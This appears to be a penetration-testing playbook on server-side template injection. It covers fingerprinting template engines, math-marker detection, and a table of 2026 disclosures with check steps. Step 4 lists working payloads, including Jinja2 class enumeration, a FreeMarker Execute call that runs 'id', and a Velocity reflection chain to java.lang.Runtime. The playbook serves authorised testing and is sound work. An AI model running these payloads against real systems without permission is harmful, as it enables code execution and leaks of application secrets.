# SSTI — Server-Side Template Injection

Goal: detect which template engine runs server-side by causing a distinctive evaluation
error or a deterministic math/string result, then (only with approval) prove code execution.

> **Detection-only.** Fingerprint and math markers only; class enumeration and any RCE payload are
> confirm-tier — explicit per-action approval (`knowledge.md` rule 2), never against production.

## Step 1 — fingerprint the engine (error messages)

Send a raw `${{<expr>}}` / `${<expr>}` / `<%= <expr> %>` and read the error. Distinctive
errors map to engines:

| Engine | Signature error / syntax |
|---|---|
| Jinja2 (Python) | `jinja2.exceptions.UndefinedError`, `TemplateSyntaxError` |
| Twig (PHP) | `Twig\Error\SyntaxError` |
| Freemarker (Java) | `freemarker.core.InvalidReferenceException` |
| Velocity (Java) | `org.apache.velocity.exception` |
| Go `html/template` | `template: ... at <...>` |
| ERB (Ruby) | `(erb):1: syntax error` |
| Handlebars | `Parse error` |
| Pug/Jade (Node) | `TypeError` / `Cannot read property` |

## Step 2 — confirm evaluation (math marker)

Once you have an engine hint, inject a deterministic expression and check the *rendered*
output (not just reflection):

- **Jinja2 / Twig / ERB / Nunjucks:** `{{ 7*7 }}` → expect `49`
- **Freemarker:** `${7*7}` → `49`
- **Velocity:** `#set($x=7*7)$x` → `49`
- **Go text/template:** `{{printf "%d" 9999}}` (Go has no `*` in templates)
- **Pug:** `#{7*7}` → `49`

## Step 3 — read-back markers (blind detection)

If the result isn't reflected, use an OOB/read-back side effect:

- Jinja2: `{{ 'MARKER' }}` then grep the page for `MARKER`.
- Blind/time: `${'MARKER'.toString().repeat(1)}` variants, or a sleep with a *short* cap.

## Step 4 — PoC (requires approval, read-only where possible)

- **Jinja2:** `{{ config }}` (app config), `{{ self.__init__.__globals__ }}`, or
  `{{ ''.__class__.__mro__[1].__subclasses__() }}` to enumerate classes.
- **Freemarker:** `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`
- **Velocity:** `#set($s="")$s.getClass().forName("java.lang.Runtime")`
- **Twig:** `{{ _self }}`, `{{ dump(app) }}` (Symfony).

Do NOT run `id`/`whoami` until the user confirms; a class enumeration is usually enough proof.

## Step 5 — 2026 template-engine disclosures

Most 2026 SSTI was **stored template** injection, not reflected: the payload is a template body an
admin/config surface saves, and the sink is a later render (email, export, agent workflow). That
changes the probe: write a math marker into the *stored* template, then read the artifact that gets
rendered from it. Same engines, different entry point.

| Engine / sink | CVE / advisory | Date | Affected | Check |
|---|---|---|---|---|
| FreeMarker, stored email template | CVE-2026-22244 / GHSA-5f29-2333-h9c7 | 2026-01 | OpenMetadata 1.5.0–<1.11.4 | save `${7*7}` as template body, read the rendered mail |
| Twig, export templates | CVE-2026-23626 / GHSA-jg2j-2w24-54cg | 2026-01 | Kimai ≤2.45.0 | sandbox policy: can the template reach `app`/`request`? |
| FreeMarker, email handler | CVE-2026-3725 / GHSA-3vhr-rrhf-p2mj | 2026-03 | SmartAdmin ≤3.29 | template body is remotely influenced |
| Twig, text fields / System Messages | CVE-2026-28784 / GHSA-qc86-q28f-ggww | 2026-03 | Craft CMS <4.16.18, <5.8.22 | does a text field evaluate Twig under the stated permissions? |
| Jinja2, Agent components | CVE-2026-28797 / GHSA-vvwj-fvwh-4whx | 2026-04 | RAGFlow v0.24.0 (no fixed version listed) | authenticated user configures a component; math marker in the workflow |
| Twig, Hidden-field defaults | CVE-2026-52889 / GHSA-565m-g33j-jq96 | 2026-05 | Formie for Craft 5 3.0.0-beta.1–3.1.26 | default sourced from header/URL/cookie, then rendered |
| Twig `string_render` | CVE-2026-28496 / GHSA-57mv-jm88-66jc | 2026-06 | FOSSBilling 0.1.0–0.7.2 (fix 0.8.0) | benign expression via the string-render API; separately audit `/api/system/` authz |
| Velocity, stored template | CVE-2026-41258 | 2026-05 | OpenMRS 2.7.0–<2.7.9, 2.8.0–<2.8.6 | `#set($x=7*7)$x` in a stored template, read the rendered page |
| Velocity, document generation | CVE-2026-38165 | 2026-08 | xdocreport 0.9.2–2.2.0 | template body influenced by the request, then exported |
| Handlebars AST injection | CVE-2026-33938 / GHSA-3mfm-83xf-c92r | 2026-03 | handlebars 4.0.0–4.7.8 | marker expression in a template compiled from user input |

A stored-template hit is `triggered` when the marker evaluates in the rendered artifact and
`exploited` only when the evaluation reaches data or code you were not meant to reach. Record as
`ssti` (CWE-1336).

SpEL/OGNL/EL are a different parser family and live in `tools/payloads/jndi-spel-ognl.md` §4 — the
2026 Spring AI (CVE-2026-22738), Spring Framework (CVE-2026-59283) and Struts (CVE-2026-104711)
rows are recorded there, as `injection` (CWE-917), not `ssti`.
